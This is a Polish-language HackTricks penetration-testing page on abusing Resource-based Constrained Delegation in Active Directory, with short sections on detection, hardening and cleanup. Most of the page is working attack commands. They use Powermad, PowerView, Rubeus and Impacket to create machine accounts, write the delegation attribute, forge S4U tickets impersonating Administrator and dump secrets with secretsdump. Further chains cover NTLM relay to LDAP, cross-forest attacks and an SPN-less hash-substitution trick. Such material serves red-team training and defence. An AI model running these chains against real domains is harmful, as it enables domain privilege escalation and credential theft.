# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Podstawy Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) jest podobne do [constrained delegation](constrained-delegation.md), ale kierunek zaufania jest odwrócony. Tradycyjne constrained delegation rejestruje, do których usług principal może delegować; RBCD rejestruje na **docelowym zasobie**, które principals mogą dokonywać na nim impersonation użytkowników.<sup>[[12]](#references)</sup>

Atrybut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ obiektu docelowego zawiera security descriptor identyfikujący principals uprawnione do działania w imieniu innych identities wobec tego zasobu.

Kolejną ważną różnicą jest to, że principal posiadający wystarczające **uprawnienia zapisu do machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` i podobne uprawnienia) może być w stanie ustawić _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Konfigurowanie tradycyjnego constrained delegation zwykle wymaga bardziej uprzywilejowanego dostępu administracyjnego.<sup>[[1]](#references)</sup>

Dokładniej, zmiana ustawień klasycznego constrained delegation jest zwykle kontrolowana przez `SeEnableDelegationPrivilege` na domain controllerze — uprawnienie to jest zazwyczaj posiadane przez highly privileged administrators. RBCD przenosi tę decyzję do security descriptor obiektu docelowego, więc dostęp zapisu do odpowiedniej właściwości computer object może być wystarczający bez tego user right.<sup>[[1]](#references)[[2]](#references)</sup>

### Nowe Concepts

Flaga **`TrustedToAuthForDelegation`** w `userAccountControl` jest często opisywana jako prerequisite dla **S4U2Self**, ale jest to niepełne.\
Service principal z SPN może zażądać S4U2Self bez tej flagi. Z `TrustedToAuthForDelegation` zwrócony service ticket jest **forwardable**; bez niej ticket jest zwykle **non-forwardable**.<sup>[[5]](#references)</sup>

Tradycyjne constrained delegation odrzuca **non-forwardable TGS** w kroku S4U2Proxy. RBCD może zaakceptować ten ticket S4U2Self, gdy security descriptor celu autoryzuje requesting service.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Struktura attack

> Jeśli masz **uprawnienia równoważne uprawnieniom zapisu** do **computer account**, możesz być w stanie uzyskać uprzywilejowany dostęp do tej maszyny.

Załóżmy, że attacker ma już **uprawnienia równoważne uprawnieniom zapisu do obiektu victim computer**.

1. Attacker **kompromituje** account z **SPN** lub **tworzy taki account** ("Service A"). Domyślnie authenticated domain user może utworzyć maksymalnie 10 computer objects, zgodnie z ustawieniem **_MachineAccountQuota_**; computer object automatycznie dostarcza użyteczne SPNs.
2. Attacker **wykorzystuje swoje uprawnienie WRITE** do victim computer (ServiceB), aby skonfigurować **resource-based constrained delegation i zezwolić ServiceA na impersonation dowolnego użytkownika** wobec tego victim computer (ServiceB).
3. Attacker używa Rubeus do wykonania **pełnego S4U attack** (S4U2Self i S4U2Proxy) z Service A do Service B dla użytkownika **posiadającego uprzywilejowany dostęp do Service B**.
1. S4U2Self (z compromised lub created SPN account): zażądaj **TGS reprezentującego Administratora do Service A** (non-forwardable).
2. S4U2Proxy: użyj tego **non-forwardable TGS**, aby zażądać service ticket reprezentującego **Administratora** do **victim host**.
3. Non-forwardable ticket może nadal działać w tym flow RBCD, ponieważ Service A jest autoryzowany w security descriptor docelowego resource.
4. Attacker może wykonać **pass-the-ticket** i **impersonate** użytkownika, aby uzyskać **dostęp do victim ServiceB**.<sup>[[1]](#references)</sup>

Aby sprawdzić _**MachineAccountQuota**_ domeny, możesz użyć:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera w domenie za pomocą **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie Resource-based Constrained Delegation

**Korzystanie z modułu PowerShell Active Directory**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Używanie powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Przeprowadzanie kompletnego ataku S4U (Windows/Rubeus)

Najpierw utworzyliśmy nowy obiekt Computer z hasłem `123456`, więc potrzebujemy hasha tego hasła:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Spowoduje to wyświetlenie hashy RC4 i AES dla tego konta.\
Teraz można przeprowadzić atak:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować więcej ticketów dla większej liczby usług, prosząc tylko raz za pomocą parametru `/altservice` narzędzia Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Użytkownicy mogą mieć ustawioną opcję **"Account is sensitive and cannot be delegated."** Jeśli ta flaga jest włączona, konto nie może być impersonowane za pośrednictwem tego procesu delegacji. BloodHound udostępnia tę właściwość podczas analizy.

### Narzędzia Linux: kompleksowe RBCD z Impacket (2024+)

Jeśli pracujesz z Linux, możesz przeprowadzić pełny łańcuch RBCD przy użyciu oficjalnych narzędzi Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Uwagi
- Jeśli wymuszane jest LDAP signing/LDAPS, użyj `impacket-rbcd -use-ldaps ...`.
- Preferuj klucze AES; wiele nowoczesnych domen ogranicza RC4. Impacket i Rubeus obsługują przepływy wyłącznie z AES.
- Impacket może przepisywać `sname` ("AnySPN") w przypadku niektórych narzędzi, ale zawsze, gdy to możliwe, uzyskaj poprawny SPN (np. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD między domenami i lasami

Jeśli kontrolowany przez Ciebie **delegating principal** znajduje się w **innej domenie** (lub nawet w **innym lesie**) niż **resource computer**, nadużycie nadal jest **RBCD**, ale przepływ biletów nie przebiega już zgodnie ze standardowym, jednodomenowym schematem `S4U2Self -> S4U2Proxy`.

### RBCD między domenami: skonfiguruj foreign principal za pomocą SID

Gdy ustawiasz `msDS-AllowedToActOnBehalfOfOtherIdentity` z poziomu **innej domeny**, foreign machine/user może **nie być rozpoznawalny po nazwie** w LDAP docelowej domeny. W takim przypadku skonfiguruj wpis delegacji, używając **SID** foreign principal zamiast jego sAMAccountName/UPN.

Jest to szczególnie istotne podczas relayowania NTLM do LDAP za pomocą `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` mówi `ntlmrelayx.py`, aby traktował `--escalate-user` jako SID, co jest wymagane, gdy konto delegujące pochodzi z innej domeny niż domena docelowa.
- Nawet jeśli narzędzie wyświetli `User not found in LDAP`, zapis delegacji może się powieść, ponieważ deskryptor zabezpieczeń przechowuje bezpośrednio obcy SID.

### Cross-domain RBCD: sekwencja cross-realm S4U

Gdy obcy principal znajduje się już w `msDS-AllowedToActOnBehalfOfOtherIdentity`, działający przepływ cross-domain wygląda następująco:<sup>[[9]](#references)[[13]](#references)</sup>

1. Uzyskaj **TGT** dla principala delegującego z jego własnej domeny.
2. Zażądaj **referral TGT** dla `krbtgt/<target-domain>`.
3. Zażądaj **cross-realm S4U2Self referral** dla impersonowanego użytkownika na kontrolerze domeny docelowej.
4. Zażądaj właściwego biletu **S4U2Self** dla tego użytkownika z powrotem w domenie delegatora.
5. Wykonaj **S4U2Proxy** w domenie delegatora, aby uzyskać bilet referral dla domeny docelowej.
6. Wykonaj końcowe **S4U2Proxy** na kontrolerze domeny docelowej, aby uzyskać bilet usługi dla `cifs/host.target`, `host/host.target` itd.

Z tego powodu standardowe narzędzia Linux często zawodzą w przypadku cross-domain RBCD:<sup>[[9]](#references)</sup>
- żądany **realm** może wymagać innej wartości niż realm TGT użytego w `TGS-REQ`
- łańcuch wymaga **niezależnych kroków S4U2Proxy**, a nie tylko `S4U2Self` lub `S4U2Self` bezpośrednio połączonego z pojedynczym `S4U2Proxy`

### Cross-domain RBCD z systemu Linux

Synacktiv opublikował implementację `getST.py` dla Impacket, która odtwarza sekwencję cross-realm z systemu Linux poprzez jawne obsługiwanie obu KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Operacyjnie nowe argumenty to:
- `-dc-ip`: DC **delegującej** domeny
- `-targetdomain`: domena **komputera zasobu**
- `-targetdc`: DC domeny **zasobu**

### Ograniczenia RBCD między lasami

RBCD między lasami ma istotne ograniczenie: **personifikowany użytkownik musi należeć do tego samego lasu co delegujący principal**. Innymi słowy, jeśli kontrolowane przez Ciebie konto komputera znajduje się w `valhalla.local`, a docelowy zasób w `asgard.local`, zazwyczaj **nie możesz personifikować dowolnych użytkowników `asgard.local`** na tym zasobie za pomocą RBCD.<sup>[[9]](#references)</sup>

Nadal jest to możliwe do wykorzystania, gdy:
- użytkownik z **delegującego lasu** jest **lokalnym administratorem** (lub ma inne uprzywilejowane uprawnienia) na hoście zasobu w drugim lesie
- trust umożliwia wymaganą ścieżkę uwierzytelniania, a obcy SID jest akceptowany w deskryptorze zabezpieczeń docelowego komputera

### Specyfika protokołu RBCD między lasami

RBCD między lasami to nie tylko „cross-domain plus trust”. Zaobserwowany przepływ obejmuje dwie osobliwości, które często są pomijane przez narzędzia:<sup>[[9]](#references)</sup>

1. Dodatkowe żądanie **S4U2Proxy**, które ustawia **`PA-PAC-OPTIONS=branch-aware`**
2. Końcowy bilet usługi, który może zostać zwrócony z użyciem **RC4**, nawet jeśli żądano innych etypes

Praktyczny przepływ wygląda następująco:

1. Uzyskaj TGT dla delegującego principal w lesie A.
2. Zażądaj **S4U2Self** dla personifikowanego użytkownika w lesie A.
3. Zażądaj **S4U2Proxy** w lesie A, aby uzyskać referral TGT dla lasu B.
4. Wyślij drugie **S4U2Proxy** w lesie A **bez biletu S4U2Self jako dodatkowego biletu**, ale z włączoną opcją `branch-aware`, aby uzyskać kolejny referral TGT dla lasu B.
5. Opcjonalnie zażądaj normalnego biletu usługi w lesie B dla delegującego principal (bilet ten nie jest wymagany do końcowego wykorzystania podatności).
6. Użyj referral tickets z kroków 3 i 4, aby zażądać końcowego biletu **S4U2Proxy** w lesie B dla personifikowanego użytkownika z lasu A do docelowego SPN.

### RBCD między lasami z systemu Linux

Ta sama gałąź Impacket firmy Synacktiv dodaje przełącznik `-forest` na potrzeby tej logiki:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekurencyjne RBCD w wielu domenach (3+ domeny)

W **lasach obejmujących wiele domen** zarówno **S4U2Self**, jak i **S4U2Proxy** mogą działać **rekurencyjnie**, zamiast zatrzymywać się po jednym referral:

- **Rekurencyjne S4U2Self**: pierwsze żądanie `S4U2Self` jest wysyłane do **domeny podszywającego się użytkownika**, pośrednie przeskoki nadrzędna/podrzędna są pokonywane za pomocą standardowych referral `TGS-REQ` dla `krbtgt/<REALM>`, a **końcowe żądanie `S4U2Self`** jest wysyłane we **własnej domenie delegującego principal**.
- Oznacza to, że **samo posiadanie TGT** dla konta maszyny może wystarczyć do podszycia się pod **administratora z innej domeny w tym samym lesie** i zażądania `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurencyjne S4U2Proxy** podąża w ten sam sposób za łańcuchem zaufania: pośrednie przeskoki ponownie wykorzystują poprzedni ticket jako TGT podczas żądania referral `krbtgt/<REALM>` do kolejnej domeny, a tylko ostatni przeskok zwraca końcowy service ticket.<sup>[[10]](#references)</sup>

Praktyczny przykład w tym samym lesie:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Jeśli **delegating principal jest userem bez SPN**, ostatnie rekurencyjne `S4U2Self` kończy się błędem **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Obejściem jest **ponowienie wyłącznie finalnego hopu jako `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Skrócona wersja chainu abuse:

1. Uwierzytelnij się za pomocą **NT hash**, aby skierować KDC w stronę **RC4-HMAC (etype 23)**.
2. Najpierw wykonaj żądanie **`-self -u2u`** i zachowaj ten ticket oddzielnie od późniejszego kroku proxy.
3. Wyodrębnij **TGT session key** za pomocą `describeTicket.py`.
4. Zastąp **NT hash użytkownika** tym **session key** przy użyciu `changepasswd.py -newhashes <session_key>`.
5. Użyj ponownie ticketu `S4U2Self+U2U` jako **`-additional-ticket`** podczas oddzielnego żądania **`-proxy`**.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Zastrzeżenia operacyjne:

- Gdy **pierwszy zaufany przeskok prowadzi już do innego lasu**, preferuj algorytm **branch-aware** (`getST.py ... -forest`), aby dopasować zachowanie natywnego Windows. Jeśli obcy las jest osiągany dopiero **później** w łańcuchu, przepływ rekursywny bez obsługi gałęzi może nadal działać.<sup>[[9]](#references)</sup>
- Na nowszych kontrolerach domeny **Windows Server 2022/2025** wymuszenie RC4 może zakończyć się błędem **`KDC_ERR_ETYPE_NOSUPP`** z powodu wycofywania RC4; może to sprawić, że **RBCD bez SPN** będzie niemożliwe, mimo że klasyczne RBCD oparte na SPN nadal działa z AES.<sup>[[15]](#references)</sup>
- Uruchom **`S4U2Self+U2U` przed zmianą hasha/hasła użytkownika**: `SamrChangePasswordUser` **nie przelicza ponownie kluczy AES Kerberos konta**, dlatego wcześniejsza zmiana hasła może zepsuć późniejsze żądania ticketów.<sup>[[14]](#references)</sup>
- Podszywane konto nadal musi być **delegable**: **Protected Users** oraz konta z **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated”** blokują łańcuch.

## Uwagi dotyczące wykrywania / hardeningu

- Ścieżki RBCD między domenami/lasami są nadal zwykle tworzone za pomocą **nadużycia ACL** lub **relay-to-LDAP**. Wymuś **LDAP signing** oraz **LDAP channel binding** na kontrolerach domeny, aby przerwać typowe ścieżki konfiguracji.
- Audytuj, kto może zapisywać `msDS-AllowedToActOnBehalfOfOtherIdentity` na obiektach komputerów, i rozwiązuj zapisane identyfikatory SID, w tym **foreign security principals**.
- W środowiskach z dużą liczbą trustów sprawdź **Selective Authentication**, **SID filtering** oraz to, czy użytkownicy z obcego lasu mają uprawnienia **local admin** na hostach zasobów.

### Uzyskiwanie dostępu

Ostatnia linia poleceń wykona **kompletny atak S4U i wstrzyknie TGS** od Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie zażądano TGS dla usługi **CIFS** od Administratora, więc uzyskasz dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuse różnych service tickets

Dowiedz się więcej o [**dostępnych service tickets tutaj**](silver-ticket.md#available-services).

## Enumeracja, audyt i cleanup

### Enumeracja komputerów ze skonfigurowanym RBCD

PowerShell (dekodowanie SD w celu rozwiązania SID-ów):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (odczyt lub wyczyszczenie jednym poleceniem):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Czyszczenie / reset RBCD

- PowerShell (wyczyść atrybut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że Kerberos jest skonfigurowany tak, aby nie używać DES ani RC4, a Ty dostarczasz tylko hash RC4. Dostarcz do Rubeus co najmniej hash AES256 (albo dostarcz mu hashe RC4, AES128 i AES256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** podczas `-self` dla zwykłego użytkownika: delegujący principal prawdopodobnie **nie ma SPN**. Ponów próbę wykonania **ostatniego hopu** jako **`S4U2Self+U2U`** zamiast zwykłego **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** podczas **SPN-less RBCD**: nowsze DC mogą odrzucać wymuszoną ścieżkę **RC4-HMAC** wymaganą przez sztuczkę **`S4U2Self+U2U` + session-key-substitution**. Spróbuj klasycznej ścieżki **SPN-backed** RBCD z AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas bieżącego komputera różni się od czasu DC i Kerberos nie działa prawidłowo.
- **`preauth_failed`**: Oznacza to, że podana kombinacja nazwy użytkownika i hashy nie działa podczas logowania. Możliwe, że podczas generowania hashy zapomniałeś umieścić znak "$" w nazwie użytkownika (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Może to oznaczać:
- Użytkownik, którego próbujesz impersonate, nie może uzyskać dostępu do żądanej usługi (ponieważ nie możesz go impersonate albo nie ma wystarczających uprawnień)
- Żądana usługa nie istnieje (jeśli żądasz biletu dla winrm, ale winrm nie jest uruchomiony)
- Utworzony fakecomputer utracił uprawnienia do podatnego serwera i musisz nadać mu je ponownie.
- Nadużywasz klasycznego KCD; pamiętaj, że RBCD działa z biletami S4U2Self bez możliwości forwardowania, podczas gdy KCD wymaga biletów forwardable.

## Uwagi, relaye i alternatywy

- Możesz także zapisać RBCD SD za pośrednictwem Active Directory Web Services (ADWS), jeśli LDAP jest filtrowany. Zobacz:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Łańcuchy relay Kerberos często kończą się na RBCD, aby osiągnąć lokalny SYSTEM w jednym kroku. Zobacz praktyczne przykłady end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Jeśli LDAP signing/channel binding są **wyłączone** i możesz utworzyć machine account, narzędzia takie jak **KrbRelayUp** mogą przekazać wymuszone uwierzytelnianie Kerberos do LDAP, ustawić `msDS-AllowedToActOnBehalfOfOtherIdentity` dla Twojego machine account na obiekcie docelowego komputera i natychmiast impersonate **Administrator** za pomocą S4U spoza hosta.<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Nadużywanie Resource-Based Constrained Delegation do atakowania Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Przejęcie obiektu komputera](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Nadużywanie Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: Przegląd ofensywnego Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Eksplorowanie cross-domain i cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Eksplorowanie cross-domain i cross-forest RBCD: część 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Przegląd Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Wykrywanie i usuwanie użycia RC4 w Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Szczegóły S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
